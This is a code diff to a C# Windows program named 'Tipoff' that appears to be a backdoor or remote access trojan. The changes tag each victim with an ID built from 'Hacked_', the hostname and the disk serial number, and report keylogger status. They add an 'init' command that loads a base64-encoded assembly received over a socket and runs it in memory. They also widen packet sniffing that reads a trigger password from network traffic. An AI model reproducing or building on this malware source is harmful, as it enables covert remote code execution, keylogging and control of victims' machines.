@@ -23,6 +23,8 @@ namespace Tipoff
 {
     public partial class Form1 : Form
     {
+        private string id_prefix = "Hacked_";
+
         private Socket m_Socket;
         private bool m_bConnected = false;
 
@@ -192,8 +194,13 @@ namespace Tipoff
                                 }
                                 else if (dsp.Param == 4)
                                 {
+                                    DataTable dt = fnWmiQuery("select serialnumber from win32_diskdrive");
+                                    string szSerialNumber = dt.Rows[0][0].ToString().Replace(" ", string.Empty).Trim();
+                                    string szOnlineID = $"{id_prefix}_{Dns.GetHostName()}_{szSerialNumber}";
+
                                     string szData = string.Join("|", new string[]
                                     {
+                                        szOnlineID,
                                         Environment.UserName,
                                         Dns.GetHostName(),
                                         m_bKeylogger ? "Yes" : "No",
@@ -214,7 +221,11 @@ namespace Tipoff
                                 }
                                 else if (dsp.Param == 1) //PIGN TIME, LATENCY
                                 {
-                                    s.encSend(2, 1, DateTime.Now.ToString("F"));
+                                    Task.Run(() =>
+                                    {
+                                        Thread.Sleep(1000);
+                                        s.encSend(2, 1, clsEZData.fnGenerateRandomStr());
+                                    });
                                 }
                             }
                         }
@@ -231,31 +242,39 @@ namespace Tipoff
 
         void CommandProc(Server s, string szPayload)
         {
-            string[] aCmd = szPayload.Split('|');
-            if (aCmd[0] == "dll")
+            try
             {
-                if (aCmd[1] == "ls")
+                string[] aCmd = szPayload.Split('|');
+                if (aCmd[0] == "dll")
                 {
+                    if (aCmd[1] == "ls")
+                    {
 
+                    }
+                    else if (aCmd[1] == "load")
+                    {
+
+                    }
                 }
-                else if (aCmd[1] == "load")
+                else if (aCmd[0] == "init")
                 {
+                    string[] aszData = clsEZData.fnStrToListStr(aCmd[1]).ToArray();
+                    byte[] abExeBytes = Convert.FromBase64String(aCmd[2]);
 
+                    Assembly loaded = Assembly.Load(abExeBytes);
+                    MethodInfo entry = loaded.EntryPoint;
+                    object instance = null;
+                    if (!entry.IsStatic)
+                        instance = loaded.CreateInstance(entry.Name);
+
+                    entry.Invoke(instance, new object[] { aszData });
+
+                    s.socket.Close();
                 }
             }
-            else if (aCmd[0] == "init")
+            catch (Exception ex)
             {
-                byte[] abExeBytes = Convert.FromBase64String(aCmd[1]);
-
-                Assembly loaded = Assembly.Load(abExeBytes);
-                MethodInfo entry = loaded.EntryPoint;
-                object instance = null;
-                if (!entry.IsStatic)
-                    instance = loaded.CreateInstance(entry.Name);
-
-                entry.Invoke(instance, new object[] { new string[] { } });
-
-                s.socket.Close();
+                MessageBox.Show(ex.Message);
             }
         }
 
@@ -287,7 +306,10 @@ namespace Tipoff
             Packet pkt = Packet.ParsePacket(pktRaw.LinkLayerType, pktRaw.Data);
 
             var pktTCP = pkt.Extract(typeof(TcpPacket)) as TcpPacket;
-            if (pktTCP != null && pktTCP.Syn)
+            var pktUDP = pkt.Extract(typeof(UdpPacket)) as UdpPacket;
+            var pktICMP = pkt.Extract(typeof(ICMPv4Packet)) as ICMPv4Packet;
+
+            if (pktTCP != null)
             {
                 byte[] abPayload = pktTCP.PayloadData;
                 string szPassword = Encoding.UTF8.GetString(abPayload);
